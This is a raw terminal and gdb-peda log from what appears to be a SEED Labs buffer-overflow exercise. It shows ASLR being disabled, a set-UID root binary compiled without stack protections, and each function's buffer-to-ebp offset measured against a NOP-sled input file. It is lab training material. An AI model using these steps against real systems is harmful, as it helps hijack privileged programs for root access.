[06/17/22]seed@VM:~/.../b2_17$ sudo sysctl -w kernel.randomize_va_space=0
kernel.randomize_va_space = 0
[06/17/22]seed@VM:~/.../b2_17$ sudo ln -sf /bin/zsh /bin/sh
[06/17/22]seed@VM:~/.../b2_17$ sudo su
root@VM:/home/seed/practice/b2_17# gcc -m32 -o A1 -z execstack -fno-stack-protector A1.c
root@VM:/home/seed/practice/b2_17# sudo chown root A1
root@VM:/home/seed/practice/b2_17# sudo chmod 4755 A1
root@VM:/home/seed/practice/b2_17# su seed
[06/17/22]seed@VM:~/.../b2_17$ 
[06/17/22]seed@VM:~/.../b2_17$ touch badfile
[06/17/22]seed@VM:~/.../b2_17$ gcc  -m32 -o A1_dbg -g -z execstack -fno-stack-protector A1.c
[06/17/22]seed@VM:~/.../b2_17$ gdb A1_dbg
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
/opt/gdbpeda/lib/shellcode.py:24: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if sys.version_info.major is 3:
/opt/gdbpeda/lib/shellcode.py:379: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if pyversion is 3:
Reading symbols from A1_dbg...
gdb-peda$ b bof
Breakpoint 1 at 0x1377: file A1.c, line 26.
gdb-peda$ run
Starting program: /home/seed/practice/b2_17/A1_dbg 
Input size: 517
[----------------------------------registers-----------------------------------]
EAX: 0xffffd3f3 --> 0x90909090 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x0 
EDX: 0x56557045 --> 0x3d3d3d00 ('')
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd608 --> 0x0 
ESP: 0xffffd3dc --> 0x565564cc (<main+216>:	add    esp,0x10)
EIP: 0x56556377 (<bof>:	endbr32)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556372 <myfunc3+51>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x56556375 <myfunc3+54>:	leave  
   0x56556376 <myfunc3+55>:	ret    
=> 0x56556377 <bof>:	endbr32 
   0x5655637b <bof+4>:	push   ebp
   0x5655637c <bof+5>:	mov    ebp,esp
   0x5655637e <bof+7>:	push   ebx
   0x5655637f <bof+8>:	sub    esp,0xf4
[------------------------------------stack-------------------------------------]
0000| 0xffffd3dc --> 0x565564cc (<main+216>:	add    esp,0x10)
0004| 0xffffd3e0 --> 0xffffd3f3 --> 0x90909090 
0008| 0xffffd3e4 --> 0x205 
0012| 0xffffd3e8 --> 0x205 
0016| 0xffffd3ec --> 0x5655a1a0 --> 0xfbad2488 
0020| 0xffffd3f0 --> 0x905551b4 
0024| 0xffffd3f4 --> 0x90909090 
0028| 0xffffd3f8 --> 0x90909090 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, bof (
    str=0xffffd3f3 '\220' <repeats 52 times>, "Y\324\377\377", '\220' <repeats 34 times>, "Y\324\377\377", '\220' <repeats 62 times>, "Y\324\377\377", '\220' <repeats 40 times>...) at A1.c:26
26	int bof(char *str){
gdb-peda$ b myfunc1
Breakpoint 2 at 0x565562ad: file A1.c, line 8.
gdb-peda$ c
Continuing.
1
[----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x0 
EDX: 0xffffd2e4 --> 0x1 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd3d8 --> 0xffffd608 --> 0x0 
ESP: 0xffffd2cc --> 0x565563c7 (<bof+80>:	add    esp,0x10)
EIP: 0x565562ad (<myfunc1>:	endbr32)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562a4 <frame_dummy+4>:	jmp    0x56556200 <register_tm_clones>
   0x565562a9 <__x86.get_pc_thunk.dx>:	mov    edx,DWORD PTR [esp]
   0x565562ac <__x86.get_pc_thunk.dx+3>:	ret    
=> 0x565562ad <myfunc1>:	endbr32 
   0x565562b1 <myfunc1+4>:	push   ebp
   0x565562b2 <myfunc1+5>:	mov    ebp,esp
   0x565562b4 <myfunc1+7>:	push   ebx
   0x565562b5 <myfunc1+8>:	sub    esp,0x94
[------------------------------------stack-------------------------------------]
0000| 0xffffd2cc --> 0x565563c7 (<bof+80>:	add    esp,0x10)
0004| 0xffffd2d0 --> 0xffffd3f3 --> 0x90909090 
0008| 0xffffd2d4 --> 0xffffd2e4 --> 0x1 
0012| 0xffffd2d8 --> 0x205 
0016| 0xffffd2dc --> 0x5655638a (<bof+19>:	add    eax,0x2c2e)
0020| 0xffffd2e0 --> 0xffffd358 --> 0xffffd3f3 --> 0x90909090 
0024| 0xffffd2e4 --> 0x1 
0028| 0xffffd2e8 --> 0x5655a2e0 --> 0x90909090 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, myfunc1 (
    str=0xffffd3f3 '\220' <repeats 52 times>, "Y\324\377\377", '\220' <repeats 34 times>, "Y\324\377\377", '\220' <repeats 62 times>, "Y\324\377\377", '\220' <repeats 40 times>...) at A1.c:8
8	int myfunc1(char* str){
gdb-peda$ next
[----------------------------------registers-----------------------------------]
EAX: 0x56558fb8 --> 0x3ec0 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x0 
EDX: 0xffffd2e4 --> 0x1 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd2c8 --> 0xffffd3d8 --> 0xffffd608 --> 0x0 
ESP: 0xffffd230 --> 0x1000 
EIP: 0x565562c5 (<myfunc1+24>:	mov    DWORD PTR [ebp-0xc],0x7)
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562b5 <myfunc1+8>:	sub    esp,0x94
   0x565562bb <myfunc1+14>:	call   0x565564fa <__x86.get_pc_thunk.ax>
   0x565562c0 <myfunc1+19>:	add    eax,0x2cf8
=> 0x565562c5 <myfunc1+24>:	mov    DWORD PTR [ebp-0xc],0x7
   0x565562cc <myfunc1+31>:	sub    esp,0x8
   0x565562cf <myfunc1+34>:	push   DWORD PTR [ebp+0x8]
   0x565562d2 <myfunc1+37>:	lea    edx,[ebp-0x98]
   0x565562d8 <myfunc1+43>:	push   edx
[------------------------------------stack-------------------------------------]
0000| 0xffffd230 --> 0x1000 
0004| 0xffffd234 --> 0x0 
0008| 0xffffd238 --> 0x77 ('w')
0012| 0xffffd23c --> 0x7c ('|')
0016| 0xffffd240 --> 0x102 
0020| 0xffffd244 --> 0x40 ('@')
0024| 0xffffd248 --> 0x8 
0028| 0xffffd24c --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
9	    int i = 7;
gdb-peda$ next
[----------------------------------registers-----------------------------------]
EAX: 0x56558fb8 --> 0x3ec0 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x0 
EDX: 0xffffd2e4 --> 0x1 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd2c8 --> 0xffffd3d8 --> 0xffffd608 --> 0x0 
ESP: 0xffffd230 --> 0x1000 
EIP: 0x565562cc (<myfunc1+31>:	sub    esp,0x8)
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562bb <myfunc1+14>:	call   0x565564fa <__x86.get_pc_thunk.ax>
   0x565562c0 <myfunc1+19>:	add    eax,0x2cf8
   0x565562c5 <myfunc1+24>:	mov    DWORD PTR [ebp-0xc],0x7
=> 0x565562cc <myfunc1+31>:	sub    esp,0x8
   0x565562cf <myfunc1+34>:	push   DWORD PTR [ebp+0x8]
   0x565562d2 <myfunc1+37>:	lea    edx,[ebp-0x98]
   0x565562d8 <myfunc1+43>:	push   edx
   0x565562d9 <myfunc1+44>:	mov    ebx,eax
[------------------------------------stack-------------------------------------]
0000| 0xffffd230 --> 0x1000 
0004| 0xffffd234 --> 0x0 
0008| 0xffffd238 --> 0x77 ('w')
0012| 0xffffd23c --> 0x7c ('|')
0016| 0xffffd240 --> 0x102 
0020| 0xffffd244 --> 0x40 ('@')
0024| 0xffffd248 --> 0x8 
0028| 0xffffd24c --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
11	    strcpy(buffer1, str);
gdb-peda$ p $ebp
$1 = (void *) 0xffffd2c8
gdb-peda$ p &buffer1
$2 = (char (*)[140]) 0xffffd230
gdb-peda$ p/d 0xffffd2c8 - 0xffffd230
$3 = 152
gdb-peda$ q
[06/17/22]seed@VM:~/.../b2_17$ gdb A1_dbg
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
/opt/gdbpeda/lib/shellcode.py:24: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if sys.version_info.major is 3:
/opt/gdbpeda/lib/shellcode.py:379: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if pyversion is 3:
Reading symbols from A1_dbg...
gdb-peda$ b bof
Breakpoint 1 at 0x1377: file A1.c, line 26.
gdb-peda$ run
Starting program: /home/seed/practice/b2_17/A1_dbg 
Input size: 517
[----------------------------------registers-----------------------------------]
EAX: 0xffffd3f3 --> 0x90909090 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x0 
EDX: 0x56557045 --> 0x3d3d3d00 ('')
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd608 --> 0x0 
ESP: 0xffffd3dc --> 0x565564cc (<main+216>:	add    esp,0x10)
EIP: 0x56556377 (<bof>:	endbr32)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556372 <myfunc3+51>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x56556375 <myfunc3+54>:	leave  
   0x56556376 <myfunc3+55>:	ret    
=> 0x56556377 <bof>:	endbr32 
   0x5655637b <bof+4>:	push   ebp
   0x5655637c <bof+5>:	mov    ebp,esp
   0x5655637e <bof+7>:	push   ebx
   0x5655637f <bof+8>:	sub    esp,0xf4
[------------------------------------stack-------------------------------------]
0000| 0xffffd3dc --> 0x565564cc (<main+216>:	add    esp,0x10)
0004| 0xffffd3e0 --> 0xffffd3f3 --> 0x90909090 
0008| 0xffffd3e4 --> 0x205 
0012| 0xffffd3e8 --> 0x205 
0016| 0xffffd3ec --> 0x5655a1a0 --> 0xfbad2488 
0020| 0xffffd3f0 --> 0x905551b4 
0024| 0xffffd3f4 --> 0x90909090 
0028| 0xffffd3f8 --> 0x90909090 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, bof (
    str=0xffffd3f3 '\220' <repeats 52 times>, "Y\324\377\377", '\220' <repeats 34 times>, "Y\324\377\377", '\220' <repeats 62 times>, "Y\324\377\377", '\220' <repeats 40 times>...) at A1.c:26
26	int bof(char *str){
gdb-peda$ b myfunc2
Breakpoint 2 at 0x565562e9: file A1.c, line 14.
gdb-peda$ c
Continuing.
2
[----------------------------------registers-----------------------------------]
EAX: 0x2 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x0 
EDX: 0xffffd2e4 --> 0x2 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd3d8 --> 0xffffd608 --> 0x0 
ESP: 0xffffd2cc --> 0x565563d7 (<bof+96>:	add    esp,0x10)
EIP: 0x565562e9 (<myfunc2>:	endbr32)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562e4 <myfunc1+55>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x565562e7 <myfunc1+58>:	leave  
   0x565562e8 <myfunc1+59>:	ret    
=> 0x565562e9 <myfunc2>:	endbr32 
   0x565562ed <myfunc2+4>:	push   ebp
   0x565562ee <myfunc2+5>:	mov    ebp,esp
   0x565562f0 <myfunc2+7>:	push   ebx
   0x565562f1 <myfunc2+8>:	sub    esp,0x54
[------------------------------------stack-------------------------------------]
0000| 0xffffd2cc --> 0x565563d7 (<bof+96>:	add    esp,0x10)
0004| 0xffffd2d0 --> 0xffffd3f3 --> 0x90909090 
0008| 0xffffd2d4 --> 0xffffd2e4 --> 0x2 
0012| 0xffffd2d8 --> 0x205 
0016| 0xffffd2dc --> 0x5655638a (<bof+19>:	add    eax,0x2c2e)
0020| 0xffffd2e0 --> 0xffffd358 --> 0xffffd3f3 --> 0x90909090 
0024| 0xffffd2e4 --> 0x2 
0028| 0xffffd2e8 --> 0x5655a2e0 --> 0x90909090 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, myfunc2 (
    str=0xffffd3f3 '\220' <repeats 52 times>, "Y\324\377\377", '\220' <repeats 34 times>, "Y\324\377\377", '\220' <repeats 62 times>, "Y\324\377\377", '\220' <repeats 40 times>...) at A1.c:14
14	int myfunc2(char* str){
gdb-peda$ next
[----------------------------------registers-----------------------------------]
EAX: 0x56558fb8 --> 0x3ec0 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x0 
EDX: 0xffffd2e4 --> 0x2 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd2c8 --> 0xffffd3d8 --> 0xffffd608 --> 0x0 
ESP: 0xffffd270 --> 0x3 
EIP: 0x565562fe (<myfunc2+21>:	mov    DWORD PTR [ebp-0x1d],0x6c6c6548)
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562f1 <myfunc2+8>:	sub    esp,0x54
   0x565562f4 <myfunc2+11>:	call   0x565564fa <__x86.get_pc_thunk.ax>
   0x565562f9 <myfunc2+16>:	add    eax,0x2cbf
=> 0x565562fe <myfunc2+21>:	mov    DWORD PTR [ebp-0x1d],0x6c6c6548
   0x56556305 <myfunc2+28>:	mov    DWORD PTR [ebp-0x19],0x6f57206f
   0x5655630c <myfunc2+35>:	mov    DWORD PTR [ebp-0x15],0x646c72
   0x56556313 <myfunc2+42>:	mov    DWORD PTR [ebp-0x11],0x0
   0x5655631a <myfunc2+49>:	mov    DWORD PTR [ebp-0xd],0x0
[------------------------------------stack-------------------------------------]
0000| 0xffffd270 --> 0x3 
0004| 0xffffd274 --> 0x3 
0008| 0xffffd278 --> 0xffffd2ac --> 0xf7e21ea9 (<__isoc99_scanf+41>:	add    esp,0x1c)
0012| 0xffffd27c --> 0xf7fb4000 --> 0x1e6d6c 
0016| 0xffffd280 --> 0xf7e4b3db (<_IO_setb+11>:	add    ebx,0x168c25)
0020| 0xffffd284 --> 0xf7fb4000 --> 0x1e6d6c 
0024| 0xffffd288 --> 0x5655a1a0 --> 0xfbad2488 
0028| 0xffffd28c --> 0x5d9cde00 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
15	    char s[21] = "Hello World";
gdb-peda$ next
[----------------------------------registers-----------------------------------]
EAX: 0x56558fb8 --> 0x3ec0 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x0 
EDX: 0xffffd2e4 --> 0x2 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd2c8 --> 0xffffd3d8 --> 0xffffd608 --> 0x0 
ESP: 0xffffd270 --> 0x3 
EIP: 0x56556325 (<myfunc2+60>:	sub    esp,0x8)
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556313 <myfunc2+42>:	mov    DWORD PTR [ebp-0x11],0x0
   0x5655631a <myfunc2+49>:	mov    DWORD PTR [ebp-0xd],0x0
   0x56556321 <myfunc2+56>:	mov    BYTE PTR [ebp-0x9],0x0
=> 0x56556325 <myfunc2+60>:	sub    esp,0x8
   0x56556328 <myfunc2+63>:	push   DWORD PTR [ebp+0x8]
   0x5655632b <myfunc2+66>:	lea    edx,[ebp-0x56]
   0x5655632e <myfunc2+69>:	push   edx
   0x5655632f <myfunc2+70>:	mov    ebx,eax
[------------------------------------stack-------------------------------------]
0000| 0xffffd270 --> 0x3 
0004| 0xffffd274 --> 0x3 
0008| 0xffffd278 --> 0xffffd2ac ("ello World")
0012| 0xffffd27c --> 0xf7fb4000 --> 0x1e6d6c 
0016| 0xffffd280 --> 0xf7e4b3db (<_IO_setb+11>:	add    ebx,0x168c25)
0020| 0xffffd284 --> 0xf7fb4000 --> 0x1e6d6c 
0024| 0xffffd288 --> 0x5655a1a0 --> 0xfbad2488 
0028| 0xffffd28c --> 0x5d9cde00 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
17	    strcpy(buffer2, str);
gdb-peda$ p $ebp
$1 = (void *) 0xffffd2c8
gdb-peda$ p &buffer2
$2 = (char (*)[57]) 0xffffd272
gdb-peda$ p/d 0xffffd2c8 - 0xffffd272
$3 = 86
gdb-peda$ q
[06/17/22]seed@VM:~/.../b2_17$ gdb A1_dbg
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
/opt/gdbpeda/lib/shellcode.py:24: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if sys.version_info.major is 3:
/opt/gdbpeda/lib/shellcode.py:379: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if pyversion is 3:
Reading symbols from A1_dbg...
gdb-peda$ b bof
Breakpoint 1 at 0x1377: file A1.c, line 26.
gdb-peda$ run
Starting program: /home/seed/practice/b2_17/A1_dbg 
Input size: 517
[----------------------------------registers-----------------------------------]
EAX: 0xffffd3f3 --> 0x90909090 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x0 
EDX: 0x56557045 --> 0x3d3d3d00 ('')
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd608 --> 0x0 
ESP: 0xffffd3dc --> 0x565564cc (<main+216>:	add    esp,0x10)
EIP: 0x56556377 (<bof>:	endbr32)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556372 <myfunc3+51>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x56556375 <myfunc3+54>:	leave  
   0x56556376 <myfunc3+55>:	ret    
=> 0x56556377 <bof>:	endbr32 
   0x5655637b <bof+4>:	push   ebp
   0x5655637c <bof+5>:	mov    ebp,esp
   0x5655637e <bof+7>:	push   ebx
   0x5655637f <bof+8>:	sub    esp,0xf4
[------------------------------------stack-------------------------------------]
0000| 0xffffd3dc --> 0x565564cc (<main+216>:	add    esp,0x10)
0004| 0xffffd3e0 --> 0xffffd3f3 --> 0x90909090 
0008| 0xffffd3e4 --> 0x205 
0012| 0xffffd3e8 --> 0x205 
0016| 0xffffd3ec --> 0x5655a1a0 --> 0xfbad2488 
0020| 0xffffd3f0 --> 0x905551b4 
0024| 0xffffd3f4 --> 0x90909090 
0028| 0xffffd3f8 --> 0x90909090 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, bof (
    str=0xffffd3f3 '\220' <repeats 52 times>, "Y\324\377\377", '\220' <repeats 34 times>, "Y\324\377\377", '\220' <repeats 62 times>, "Y\324\377\377", '\220' <repeats 40 times>...) at A1.c:26
26	int bof(char *str){
gdb-peda$ b myfunc3
Breakpoint 2 at 0x5655633f: file A1.c, line 20.
gdb-peda$ c
Continuing.
3
[----------------------------------registers-----------------------------------]
EAX: 0x3 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x0 
EDX: 0xffffd2e4 --> 0x3 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd3d8 --> 0xffffd608 --> 0x0 
ESP: 0xffffd2cc --> 0x565563e7 (<bof+112>:	add    esp,0x10)
EIP: 0x5655633f (<myfunc3>:	endbr32)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5655633a <myfunc2+81>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x5655633d <myfunc2+84>:	leave  
   0x5655633e <myfunc2+85>:	ret    
=> 0x5655633f <myfunc3>:	endbr32 
   0x56556343 <myfunc3+4>:	push   ebp
   0x56556344 <myfunc3+5>:	mov    ebp,esp
   0x56556346 <myfunc3+7>:	push   ebx
   0x56556347 <myfunc3+8>:	sub    esp,0x34
[------------------------------------stack-------------------------------------]
0000| 0xffffd2cc --> 0x565563e7 (<bof+112>:	add    esp,0x10)
0004| 0xffffd2d0 --> 0xffffd3f3 --> 0x90909090 
0008| 0xffffd2d4 --> 0xffffd2e4 --> 0x3 
0012| 0xffffd2d8 --> 0x205 
0016| 0xffffd2dc --> 0x5655638a (<bof+19>:	add    eax,0x2c2e)
0020| 0xffffd2e0 --> 0xffffd358 --> 0xffffd3f3 --> 0x90909090 
0024| 0xffffd2e4 --> 0x3 
0028| 0xffffd2e8 --> 0x5655a2e0 --> 0x90909090 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, myfunc3 (
    str=0xffffd3f3 '\220' <repeats 52 times>, "Y\324\377\377", '\220' <repeats 34 times>, "Y\324\377\377", '\220' <repeats 62 times>, "Y\324\377\377", '\220' <repeats 40 times>...) at A1.c:20
20	int myfunc3(char* str){
gdb-peda$ next
[----------------------------------registers-----------------------------------]
EAX: 0x56558fb8 --> 0x3ec0 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x0 
EDX: 0xffffd2e4 --> 0x3 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd2c8 --> 0xffffd3d8 --> 0xffffd608 --> 0x0 
ESP: 0xffffd290 --> 0x5655a1a0 --> 0xfbad2488 
EIP: 0x56556354 (<myfunc3+21>:	fld    QWORD PTR [eax-0x1f50])
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556347 <myfunc3+8>:	sub    esp,0x34
   0x5655634a <myfunc3+11>:	call   0x565564fa <__x86.get_pc_thunk.ax>
   0x5655634f <myfunc3+16>:	add    eax,0x2c69
=> 0x56556354 <myfunc3+21>:	fld    QWORD PTR [eax-0x1f50]
   0x5655635a <myfunc3+27>:	fstp   QWORD PTR [ebp-0x10]
   0x5655635d <myfunc3+30>:	sub    esp,0x8
   0x56556360 <myfunc3+33>:	push   DWORD PTR [ebp+0x8]
   0x56556363 <myfunc3+36>:	lea    edx,[ebp-0x30]
[------------------------------------stack-------------------------------------]
0000| 0xffffd290 --> 0x5655a1a0 --> 0xfbad2488 
0004| 0xffffd294 --> 0x5655a2e0 --> 0x90909090 
0008| 0xffffd298 --> 0x5655b2e0 --> 0x0 
0012| 0xffffd29c --> 0x56558fb8 --> 0x3ec0 
0016| 0xffffd2a0 --> 0xf7fb4000 --> 0x1e6d6c 
0020| 0xffffd2a4 --> 0xf7fb4000 --> 0x1e6d6c 
0024| 0xffffd2a8 --> 0xffffd3d8 --> 0xffffd608 --> 0x0 
0028| 0xffffd2ac --> 0xf7e21ea9 (<__isoc99_scanf+41>:	add    esp,0x1c)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
21	    double d = 71.69;
gdb-peda$ next
[----------------------------------registers-----------------------------------]
EAX: 0x56558fb8 --> 0x3ec0 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x0 
EDX: 0xffffd2e4 --> 0x3 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd2c8 --> 0xffffd3d8 --> 0xffffd608 --> 0x0 
ESP: 0xffffd290 --> 0x5655a1a0 --> 0xfbad2488 
EIP: 0x5655635d (<myfunc3+30>:	sub    esp,0x8)
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5655634f <myfunc3+16>:	add    eax,0x2c69
   0x56556354 <myfunc3+21>:	fld    QWORD PTR [eax-0x1f50]
   0x5655635a <myfunc3+27>:	fstp   QWORD PTR [ebp-0x10]
=> 0x5655635d <myfunc3+30>:	sub    esp,0x8
   0x56556360 <myfunc3+33>:	push   DWORD PTR [ebp+0x8]
   0x56556363 <myfunc3+36>:	lea    edx,[ebp-0x30]
   0x56556366 <myfunc3+39>:	push   edx
   0x56556367 <myfunc3+40>:	mov    ebx,eax
[------------------------------------stack-------------------------------------]
0000| 0xffffd290 --> 0x5655a1a0 --> 0xfbad2488 
0004| 0xffffd294 --> 0x5655a2e0 --> 0x90909090 
0008| 0xffffd298 --> 0x5655b2e0 --> 0x0 
0012| 0xffffd29c --> 0x56558fb8 --> 0x3ec0 
0016| 0xffffd2a0 --> 0xf7fb4000 --> 0x1e6d6c 
0020| 0xffffd2a4 --> 0xf7fb4000 --> 0x1e6d6c 
0024| 0xffffd2a8 --> 0xffffd3d8 --> 0xffffd608 --> 0x0 
0028| 0xffffd2ac --> 0xf7e21ea9 (<__isoc99_scanf+41>:	add    esp,0x1c)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
23	    strcpy(buffer3, str);
gdb-peda$ p $ebp
$1 = (void *) 0xffffd2c8
gdb-peda$ p &buffer3
$2 = (char (*)[32]) 0xffffd298
gdb-peda$ p/d 0xffffd2c8 - 0xffffd298
$3 = 48
gdb-peda$ q
[06/17/22]seed@VM:~/.../b2_17$ gdb A1_dbg
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
/opt/gdbpeda/lib/shellcode.py:24: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if sys.version_info.major is 3:
/opt/gdbpeda/lib/shellcode.py:379: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if pyversion is 3:
Reading symbols from A1_dbg...
gdb-peda$ b bof 
Breakpoint 1 at 0x1377: file A1.c, line 26.
gdb-peda$ run
Starting program: /home/seed/practice/b2_17/A1_dbg 
Input size: 517
[----------------------------------registers-----------------------------------]
EAX: 0xffffd3f3 --> 0x90909090 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x0 
EDX: 0x56557045 --> 0x3d3d3d00 ('')
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd608 --> 0x0 
ESP: 0xffffd3dc --> 0x565564cc (<main+216>:	add    esp,0x10)
EIP: 0x56556377 (<bof>:	endbr32)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556372 <myfunc3+51>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x56556375 <myfunc3+54>:	leave  
   0x56556376 <myfunc3+55>:	ret    
=> 0x56556377 <bof>:	endbr32 
   0x5655637b <bof+4>:	push   ebp
   0x5655637c <bof+5>:	mov    ebp,esp
   0x5655637e <bof+7>:	push   ebx
   0x5655637f <bof+8>:	sub    esp,0xf4
[------------------------------------stack-------------------------------------]
0000| 0xffffd3dc --> 0x565564cc (<main+216>:	add    esp,0x10)
0004| 0xffffd3e0 --> 0xffffd3f3 --> 0x90909090 
0008| 0xffffd3e4 --> 0x205 
